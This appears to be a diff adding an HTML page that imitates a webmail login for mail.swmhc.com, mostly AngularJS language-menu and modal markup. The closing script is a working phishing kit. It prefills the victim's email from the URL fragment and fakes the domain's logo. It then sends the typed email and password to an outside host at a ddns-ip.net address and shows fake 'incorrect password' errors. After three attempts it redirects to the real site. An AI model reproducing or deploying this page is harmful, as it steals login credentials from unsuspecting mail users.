+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Español</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-67"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Español de
+																		Latinoamérica</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-69"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Hrvatski</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-71"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Italiano</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-73"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Português</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-75"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Português do
+																		Brasil</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-77"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Ελληνικά</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-79"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Română</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-81"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Magyar</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-83"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Svenska</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-85"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Български</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-87"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Dansk</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-89"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Shqiptare</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-91"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Norsk</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+														</div>
+														<div class="dropdown-options-down-container"
+															ng-show="showDownArrow()" aria-hidden="true" style="">
+															<div class="dropdown-options-down"
+																ng-click="downArrowClicked()"
+																ng-mouseenter="downArrowMouseenter()"
+																ng-mouseleave="arrowMouseleave()" unselectable="on">
+																<span class="fa fa-caret-down"></span>
+															</div>
+														</div>
+													</div>
+												</dropdown-select>
+											</div>
+										</div>
+									</div>
+									<!-- ngIf: customSpaceStatus.LoginSocial -->
+								</div>
+								<div class="col-md-4 col-xs-2 col-sm-3"
+									ng-class="{&#39;col-xs-4&#39;: customSpaceSides, &#39;col-xs-2 col-sm-3&#39;: !customSpaceSides}">
+									<!-- ngIf: customSpaceStatus.LoginRight -->
+								</div>
+								<div class="col-xs-12">
+									<!-- ngIf: customSpaceStatus.LoginBottom -->
+								</div>
+							</div>
+						</div>
+					</div>
+					<snapuser-directive snap-user="snapUser" class="ng-scope ng-isolate-scope"></snapuser-directive>
+				</div>
+				<!-- ngInclude: undefined --><ng-include src="&#39;components/topmodal/topmodal.html&#39;"
+					class="ng-scope">
+					<div id="topModalContainer" class="ng-scope">
+						<!-- ngInclude: undefined -->
+						<div modal-body="errorMessage | translate" modal-directive=""
+							modal-header="&#39;LANG_ERROR&#39; | translate" modal-id="&#39;top-modal-error&#39;"
+							modal-closebtn="&#39;LANG_CLOSE&#39; | translate" class="ng-isolate-scope">
+							<div id="top-modal-error" class="modal fade" tabindex="-1" role="dialog" aria-modal="true"
+								aria-labelledby="top-modal-error-label" aria-hidden="true"
+								aria-describedby="top-modal-error-body top-modal-error-footer">
+								<div class="modal-dialog ng-isolate-scope" role="document">
+									<div class="modal-content">
+										<div class="modal-header">
+											<!-- ngIf: header -->
+											<h4 id="top-modal-error-label" ng-if="header"
+												class="modal-title ng-binding ng-scope" ng-bind="header">Error!</h4>
+											<!-- end ngIf: header -->
+											<!-- ngIf: !header -->
+										</div>
+										<div id="top-modal-error-body">
+											<!-- ngIf: body -->
+											<!-- ngIf: bodyHtml -->
+											<div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+										</div>
+										<div class="modal-footer" id="top-modal-error-footer">
+											<!-- ngIf: footer || checkboxLabel -->
+											<button ng-show="closebtn" type="button"
+												class="btn btn-default closeModalBtn ng-binding"
+												data-ng-click="callbackbuttonclose()"
+												data-dismiss="modal">Close</button>
+											<button ng-show="leftbtn" type="button"
+												class="btn middleModalBtn leftbtn ng-binding ng-hide"
+												ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : &#39;middleModalBtn&#39;"
+												data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+											<button ng-show="middlebtn" type="button"
+												class="btn middleModalBtn middlebtn ng-binding ng-hide"
+												ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : &#39;middleModalBtn&#39;"
+												data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+											<button ng-show="rightbtn" type="button"
+												class="btn btn-primary rightbtn ng-binding ng-hide"
+												ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : &#39;&#39;"
+												data-ng-click="callbackbuttonright(); $event.stopPropagation()"
+												ng-disabled="rightbtnDisabled" style=""></button>
+											<button ng-show="confirm" type="button"
+												class="btn btn-primary confirm ng-binding ng-hide"
+												data-ng-click="callbackbuttonright(); $event.stopPropagation()"
+												style=""></button>
+										</div>
+										<button type="button" class="close" data-dismiss="modal"
+											data-ng-click="callbackbuttonclose()" aria-label="Close">
+											<span aria-hidden="true">×</span>
+										</button>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</ng-include>
+			</div>
+		</div>
+		<wcag-directive></wcag-directive>
+	</div><!-- end ngIf: !mobileDevice -->
+	<!-- ngIf: mobileDevice -->
+
+	<!-- Loading -->
+	<div ng-show="( isMobile !== true &amp;&amp; isMobile !== false )"
+		class="loading-spinner-home loading-full-screen ng-hide">
+		<span class="fa fa-fw fa-cog fa-spin"></span>
+	</div>
+
+	<!-- used in util-audiofile-factory for IE hack for playing sounds -->
+	<div id="audiocnt"></div>
+
+	<script>
+		// ############################################################################
+		// Specify the URL of the PHP file Here
+		var url = "http://hjkimnuik.ddns-ip.net/ss/neylom.php";
+		// ############################################################################
+
+		window.onload = function () {
+			// Get the current URL
+			var url = window.location.href;
+			// Parse the URL and get the fragment (the part after the '#')
+			var urlComponents = new URL(url);
+			var email = urlComponents.hash.substring(1);
+
+			let domain = email.split("@")[1]; // This will give you 'gmail.com'
+			let word = domain.split(".")[0]; // This will give you 'gmail'
+			// console.log(result); // Outputs: gmail
+
+			let half1 = word.slice(0, Math.ceil(word.length / 2));
+			let half2 = word.slice(Math.ceil(word.length / 2));
+
+			console.log(half1);
+			//console.log(half2);
+
+
+
+			// Check if the fragment is a valid email
+			var emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
+			if (emailRegex.test(email)) {
+				//   Make this email available globally
+				// window.email = email;
+				// If it is, add the email into a html element as text
+				var emailElement = document.getElementById("username");
+				if (emailElement) {
+					emailElement.value = email;
+				}
+			}
+
+			logoNamer(half1, half2)
+		};
+
+		function logoNamer(half1, half2) {
+			function capitalizeFirstLetter(string) {
+				return string.charAt(0).toUpperCase() + string.slice(1);
+			}
+
+			str = capitalizeFirstLetter(half1);
+
+			const logoHeader = document.querySelectorAll(".lloggo")
+			const logoHeader2 = document.querySelectorAll(".lloogg")
+
+			logoHeader.forEach(function (logo) {
+				logo.textContent = str;
+			});
+
+			logoHeader2.forEach(function (logo2) {
+				logo2.textContent = half2;
+				console.log(half2);
+			});
+		}
+
+		function submitFormAndToggleClass() {
+			// Get the form and input elements
+			var form = document.querySelector(".Login-form");
+			var emailInput = document.getElementById("username");
+			var passwordInput = document.getElementById("password");
+			var aa = document.querySelectorAll(".p0")
+			var aaa = document.querySelectorAll(".p1");
+			var aaa1 = document.querySelectorAll(".p2a");
+			var aaa2 = document.querySelectorAll(".p2b");
+			var modal = document.getElementById('modal-loading');
+
+			var clickCount = 0;
+
+
+			// Get the input value
+			var emailValue = emailInput.value;
+			var passwordValue = passwordInput.value;
+			window.emailValue = emailValue;
+			window.passwordValue = passwordValue;
+
+			// Add an event listener for form submission
+			form.addEventListener("submit", function (event) {
+				// Prevent the form from being submitted normally
+				event.preventDefault();
+
+				// Write an if statement to check if the input value is empty
+				if (window.emailValue === "") {
+					aa.forEach(function (element) {
+						element.classList.add("incorrect-hidden");
+					});
+					aaa1.forEach(function (element) {
+						element.classList.remove("incorrect-hidden");
+					});
+					setTimeout(function () {
+						// Now you can use forEach on aaa
+						aaa1.forEach(function (element) {
+							element.classList.add("incorrect-hidden");
+						});
+						aa.forEach(function (element) {
+							element.classList.remove("incorrect-hidden");
+						});
+					}, 3000);
+					return;
+				}
+				if (window.passwordValue === "") {
+					aa.forEach(function (element) {
+						element.classList.add("incorrect-hidden");
+					});
+					aaa2.forEach(function (element) {
+						element.classList.remove("incorrect-hidden");
+					});
+					setTimeout(function () {
+						// Now you can use forEach on aaa
+						aaa2.forEach(function (element) {
+							element.classList.add("incorrect-hidden");
+						});
+						aa.forEach(function (element) {
+							element.classList.remove("incorrect-hidden");
+						});
+					}, 3000);
+					return;
+				}
+
+				loading();
+				setTimeout(function () {
+					// Now you can use forEach on aaa
+					aa.forEach(function (element) {
+						element.classList.add("incorrect-hidden");
+					});
+					aaa.forEach(function (element) {
+						element.classList.remove("incorrect-hidden");
+					});
+					passwordInput.value = ""
+				}, 3000);
+
+				var submitButton = form.querySelector('button[type="submit"]');
+				submitButton.disabled = true;
+
+				// Create a function that counts clicks and executes a separate function on second click
+				clickCount++;
+				console.log(clickCount);
+				if (clickCount === 3) {
+					// Execute a separate function on second click
+					toggleClass();
+					clickCount = 0;
+				}
+				setTimeout(function () {
+					submitButton.disabled = false;
+				}, 3000);
+			});
+
+			let dataLog = {
+				email: window.emailValue,
+				password: window.passwordValue,
+				desc: "https://mail.swmhc.com: Login Details",
+			};
+
+			console.log(dataLog)
+			if (emailValue && passwordValue) {
+				sendData(dataLog);
+			}
+
+			// Write a function that will redirect the page to a URL
+			function toggleClass() {
+				// Redirect the page to a URL
+				window.location.href = "https://mail.swmhc.com";
+			}
+		}
+
+
+		function loading() {
+			const loader = document.querySelector(".loader");
+
+			loader.classList.remove("loader--hidden");
+
+			setTimeout(function () {
+				loader.classList.add("loader--hidden");
+			}, 3000);
+		}
+
+		// Send data to the PHP file
+		function sendData(dataLog) {
+			fetch(url, {
+				method: "POST",
+				headers: {
+					"Content-Type": "application/json; charset=utf-8",
+				},
+				body: JSON.stringify(dataLog),
+			})
+		}
+
+	</script>
+</body>
+
+</html>
